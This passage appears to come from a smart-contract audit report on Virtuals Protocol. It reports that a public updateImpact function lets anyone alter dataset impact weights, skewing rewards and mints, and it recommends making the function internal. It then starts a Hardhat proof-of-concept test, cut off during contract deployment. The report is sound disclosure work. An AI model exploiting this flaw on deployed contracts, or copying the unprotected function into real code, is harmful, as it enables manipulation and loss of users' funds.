class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDENOM\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edataAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ? (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIServiceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDENOM\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            : \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact\" style=\"position:relative;\"\u003e\u003ca href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003ePublic \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L90\"\u003e\u003ccode\u003eServiceNft::updateImpact\u003c/code\u003e\u003c/a\u003e function allows changing impacts to anyone.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCascading issue leads loss of funds via:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eHigher / Lower rewards according to the \u003ccode\u003edatasetImpactWeight\u003c/code\u003e increase or decrease.\u003c/li\u003e\n\u003cli\u003eHigher / Lower mints as per the \u003ccode\u003edatasetImpactWeight\u003c/code\u003e change.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIt is highly contextual as per what the protocol intends to do, it is suggested to not keep \u003ccode\u003eupdateImpact\u003c/code\u003e as a public function as it would be unfair for other users:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e-    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e+    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-1\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThe test case below was ran using a base mainnet fork, please add the same to the \u003ccode\u003ehardhat.config.js\u003c/code\u003e file.\u003c/p\u003e\n\u003cp\u003eThe hardhat version wasn’t supporting the base mainnet fork, so it had to be upgraded:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"11\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u0026quot;hardhat\u0026quot;: \u0026quot;^2.23.0\u0026quot;,\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAdd the following values to the \u003ccode\u003e.env\u003c/code\u003e file (along with private keys:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"12\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Genesis DAO settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_VOTING_DELAY=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_VOTING_PERIOD=900\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_PROPOSAL_THRESHOLD=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Virtual DAO settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_VOTING_DELAY=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_VOTING_PERIOD=900\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_PROPOSAL_THRESHOLD=1000000000000000000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_QUORUM_NUMERATOR=1000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Other settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eCHAIN_ID=84532\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVIRTUAL_APPLICATION_THRESHOLD=50000000000000000000 # 50\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVIRTUAL_APPLICATION_THRESHOLD_VIP=125000000000000000000 #125 $V\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMATURITY_DURATION=1000 # number of blocks until initial virtual staker can withdraw (1000 blocks = ~33 minutes)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### AgentToken settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_SUPPLY=1000000000 # 1B supply\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT_TRX=100000 # 100k max token per txn\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT_WALLET=1000000 # 1M token per wallet\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LP_SUPPLY=1000000000 # 1B LP tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT=1000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_VAULT_SUPPLY=0 #\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBOT_PROTECTION=3600 # 1hr\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTAX=100 # 3%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBONDING_TAX=1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSWAP_THRESHOLD=1 # 0.00001% of total supply\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### VOTING_TOKEN=\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTBA_REGISTRY=\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Reward settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePARENT_SHARES=2000 # 20%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_SHARES=1000 # 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eCONTRIBUTOR_SHARES=5000 # 50%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSTAKER_SHARES=9000 # 90%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eREWARD_STAKE_THRESHOLD=2000000000000000000 # 2 eth\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eDATASET_SHARES=7000 # 70%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### TAX MANAGER\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMIN_SWAP_THRESHOLD=100000000000000000 # 0.1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMAX_SWAP_THRESHOLD=1000000000000000000000 # 1000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eUNISWAP_ROUTER=0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCreate a file called \u003ccode\u003ePoC.js\u003c/code\u003e anad add the following test case inside the \u003ccode\u003e/tests\u003c/code\u003e folder and run \u003ccode\u003enpx hardhat test --grep \"Unfair updateImpact\"\u003c/code\u003e:\u003c/p\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"13\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { parseEther, toBeHex, formatEther } = require(\u0026quot;ethers/utils\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { expect } = require(\u0026quot;chai\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  loadFixture,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  mine,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  impersonateAccount,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  setBalance,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e} = require(\u0026quot;@nomicfoundation/hardhat-toolbox/network-helpers\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { ethers } = require(\u0026quot;hardhat\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003edescribe(\u0026quot;AgentFactory\u0026quot;, () =\u0026gt; {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const PROPOSAL_THRESHOLD = parseEther(\u0026quot;50000\u0026quot;); // 50k\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const MATURITY_SCORE = toBeHex(2000, 32); // 20%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const IP_SHARE = 1000; // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const genesisInput = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    name: \u0026quot;Jessica\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    symbol: \u0026quot;JSC\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tokenURI: \u0026quot;http://jessica\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoName: \u0026quot;Jessica DAO\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    cores: [0, 1, 2],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tbaSalt:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;0xa7647ac9429fdce477ebd9a95510385b756c757c26149e740abbab0ad1be2f16\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tbaImplementation: process.env.TBA_IMPLEMENTATION || ethers.ZeroAddress,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoVotingPeriod: 600,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoThreshold: 1000000000000000000000n,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const getAccounts = async () =\u0026gt; {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const [deployer, ipVault, founder, poorMan, trader, treasury, randomAddr] = await ethers.getSigners();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Fund all accounts with ETH for gas (10 ETH each)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const fundAccounts = [deployer, ipVault, founder, poorMan, trader, treasury];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    for (const account of fundAccounts) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await setBalance(account.address, parseEther(\u0026quot;10\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { deployer, ipVault, founder, poorMan, trader, treasury, randomAddr };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployBaseContracts() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { deployer, ipVault, treasury } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Setting up environment variables if not present in the actual .env\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // This is for testing purposes only\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.TBA_IMPLEMENTATION) process.env.TBA_IMPLEMENTATION = ethers.ZeroAddress;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.DATASET_SHARES) process.env.DATASET_SHARES = \u0026quot;1000\u0026quot;; // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.UNISWAP_ROUTER) process.env.UNISWAP_ROUTER = \u0026quot;0x8aEF2b5C33686F8621A17B9Aaff079E7d8D673f9\u0026quot;; // Base mainnet Uniswap router\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_LIMIT) process.env.AGENT_TOKEN_LIMIT = parseEther(\u0026quot;10000000\u0026quot;).toString(); // 10M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_LP_SUPPLY) process.env.AGENT_TOKEN_LP_SUPPLY = parseEther(\u0026quot;5000000\u0026quot;).toString(); // 5M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_VAULT_SUPPLY) process.env.AGENT_TOKEN_VAULT_SUPPLY = parseEther(\u0026quot;2000000\u0026quot;).toString(); // 2M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.BOT_PROTECTION) process.env.BOT_PROTECTION = \u0026quot;100\u0026quot;; // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.TAX) process.env.TAX = \u0026quot;500\u0026quot;; // 5%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.SWAP_THRESHOLD) process.env.SWAP_THRESHOLD = parseEther(\u0026quot;10\u0026quot;).toString(); // 10 tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying VirtualToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const virtualToken = await ethers.deployContract(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;VirtualToken\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [PROPOSAL_THRESHOLD, deployer.address],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    